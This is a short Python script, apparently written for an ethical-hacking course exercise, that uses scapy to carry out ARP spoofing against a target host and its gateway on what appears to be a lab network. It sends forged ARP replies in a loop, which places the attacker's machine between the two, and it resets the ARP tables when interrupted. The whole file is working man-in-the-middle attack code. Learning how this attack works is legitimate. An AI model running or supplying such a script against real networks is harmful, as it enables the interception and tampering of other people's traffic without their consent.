#!/usr/bin/env python

import scapy.all as scapy
import time
import sys


def get_mac(ip):
    arp_request = scapy.ARP(pdst=str(ip))
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac )
    scapy.send(packet, count=4, verbose=False)


target_ip = "10.0.2.15"
gateway_ip = "10.0.2.1"


try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        sys.stdout.write("\r[+] Packets sent " + str(sent_packets_count))
        # in the lecture print is used with a comma at the end but that didn't result in dynamic printing,
        # thus I usesd sys.stdout.write which works
        sys.stdout.flush()  # code to help with dynamic printing
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detected CTRL + C ........ Resetting arp tables.")
    restore(target_ip, gateway_ip)
